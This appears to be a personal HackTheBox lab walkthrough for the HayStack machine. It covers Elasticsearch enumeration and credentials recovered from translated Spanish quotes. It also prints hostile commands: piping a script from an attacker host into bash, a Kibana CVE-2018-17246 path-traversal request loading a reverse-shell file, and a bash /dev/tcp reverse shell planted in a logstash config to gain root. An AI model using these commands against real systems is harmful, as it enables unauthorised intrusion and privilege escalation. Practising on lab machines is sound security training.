# HTB_Ippsec_Note

# HayStack Machine - 10.10.10.115

nmap -sC -sV -oA nmap/haystack 10.10.10.115

Navigate to 10.10.10.115 --> Simple Photo

Lets check robots.txt

Navigate to 10.10.10.115/robots.txt --> 404 not Found

Save the image and run tools like exiftool etc.

root@kali: exiftool ~/Downloads/needle.jpg --> File Modification Date --Today

Sometimes Downloading file via browser changes the modification Meta Data

So Try downloading file via wget or curl

root@kali: wget http://10.10.10.115/needle.jpg

root@kali: exiftool needle.jpg  --> File Modification Date -- 2019:01:25

Navigate to 10.10.10.115:9200 --> You'll see a json output (Clustername: Elastic search version 6.4.2)

Google

Elastic Search api 6.4

Kibana is front End to this.

In Elastic search API documentation--> 

Cat APIs

10.10.10.115:9200/_cat/master

10.10.10.115:9200/_cat/master?v--> For verbose


You can also try --> curl http://10.10.10.115:9200/_cat/master?v

To know the commands --> curl http://10.10.10.115:9200/_cat

For DataBases --> curl http://10.10.10.115:9200/_cat/indices

For Verbose Databases --> curl http://10.10.10.115:9200/_cat/indices?v

For Help --> curl http://10.10.10.115:9200/_cat/indices?help

DOC APIs

curl http://10.10.10.115:9200/quotes/_doc/1
curl http://10.10.10.115:9200/quotes/_doc/2
curl http://10.10.10.115:9200/quotes/_doc/3

curl http://10.10.10.115:9200/quotes/_search 


curl http://10.10.10.115:9200/quotes/_search | jq . ---> To see beautified Json

Or you can use

curl http://10.10.10.115:9200/quotes/_search?pretty

curl -s http://10.10.10.115:9200/quotes/_search | jq . ---> -s for silent--Removed curl headers from output

curl -s http://10.10.10.115:9200/quotes/_search?size=1 | jq . --> Only return One Item

curl -s http://10.10.10.115:9200/quotes/_search?size=1 | jq .hits --> One Object down in JSON

curl -s http://10.10.10.115:9200/quotes/_search?size=1 | jq '.hits .hits' --> One More level down in JSON

curl -s http://10.10.10.115:9200/quotes/_search?size=1 | jq '.hits .hits[0]' --> Get rit of "[" because with 0 we are refering to first json element.

curl -s http://10.10.10.115:9200/quotes/_search?size=1 | jq '.hits .hits[0] .source' --> Next Item down 

curl -s http://10.10.10.115:9200/quotes/_search?size=1 | jq '.hits .hits[0] .source .quote'

curl -s http://10.10.10.115:9200/quotes/_search?size=253 | jq '.hits .hits[] .source .quote' --> .hits[]--> Will give all quotes


curl http://10.10.10.115:9200/_cat/indices?v

green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb      
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0      
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0     

curl -s http://10.10.10.115:9200/bank/_search?size=1 | jq '.'--> For bank info

curl -s http://10.10.10.115:9200/bank/_search?size=1000 | jq '.hits .hits[] ._source .email'


curl -s http://10.10.10.115:9200/quotes/_search?size=253 | jq '.hits .hits[] .source .quote' --> Result of this is in spanish


vi exploit.py

import requests, json

r = requests.get('http://10.10.10.115:9200/quotes/_search?size=1')
quotes = json.loads(r.text)

for quote in quotes['hits']['hits']:
	q = quote['_source']['quote']
	print(q)
	print() --> for Line break between two quotes


*** Google --> Python translate google" --> https://pypi.org/project/googletrans/

#pip3 install googletrans


vi exploit.py

import requests, json
from googletrans import Translator

r = requests.get('http://10.10.10.115:9200/quotes/_search?size=253')
quotes = json.loads(r.text)
translator = Translator()

for quote in quotes['hits']['hits']:
	q = quote['_source']['quote']
	qt = (translator.translate(q)).text
	print(qt)
	print() --> for Line break between two quotes



python3 exploit.py | tee quotes-translated.txt --> tee will print the output on console and in file simultaneouslt

cat quotes-translated.txt | grep -i password --> -i for ignore case
cat quotes-translated.txt | grep -i secret
cat quotes-translated.txt | grep -i key --> Give Some base64 encode values

\# echo -n dXnlcjogc2VjdXJpdHkg | base64 -d --> user : security
\# echo -n <other base64 value> | base64 -d --> pass : spanish.is.key


ssh security@10.10.10.115

password - spanish.is.key

security@haystack 

[security@haystack $] curl 10.10.14.3:8000/LinEnum.sh | bash


* Result showed

127.0.0.1:5601 - Kibana generally

Generally logstash has its own user but here it is running as root

[security@haystack $] curl 127.0.0.1:5601

ssh port forwarding using -L

or shortcut

[security@haystack $] ~C
ssh> -L 5602:127.0.0.1:5601
Forwarding port.


in New terminal 

root@kali# ss -ln

--> we are listening on 127.0.0.1:5602

Now navigate to kali browser and open 127.0.0.1:5602--> You'll kibana loading

Management tab --> Kibana version 6.4.2

Google -> Kibana 6.4.2 exploit

 https://github.com/mpgn/CVE-2018-17246

[security@haystack $] cd /dev/shm
[security@haystack $] vi rev.js

paste the expoit js code given in exploit and edit your IP to get reverse shell

root@kali# nc -nlvp 1337


root@kali# curl 'http://localhost:5602/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../dev/shm/rev.js'



root@kali# nc -nlvp 1337

ls 

--> we got reverse shell

python -c 'import pty;pty.spawn("/bin/bash")'

CTRL+Z

root@kali# stty raw -echo

FG --> you won't see this getting typed

bash-4.25$ whoami
kibana

bash-4.25$ find / -user kibana -ls 2>/dev/null --> To see what we have access to
bash-4.25$ find / -group kibana -ls 2>/dev/null --> To see what we have access to

bash-4.25$ ls /etc/logstash
bash-4.25$ cd /etc/logstash
bash-4.25$ ls -la 

cd conf.d
cat filter.conf
cat input.conf
cat output.conf

export Term=xterm --> Now you can clear the screen

vi /opt/kibana/logstash_pleasesubscribe

Ejecutar comando : touch /dev/shm/LeaveAComment
Ejecutar comando : bash -i >& /dev/tcp/10.10.14.3/9001 0>&1

bash-4.25$ watch -n 1 ls -la /dev/shm


root@kali# nc -nlvp 9001

[root@haystack ~]#
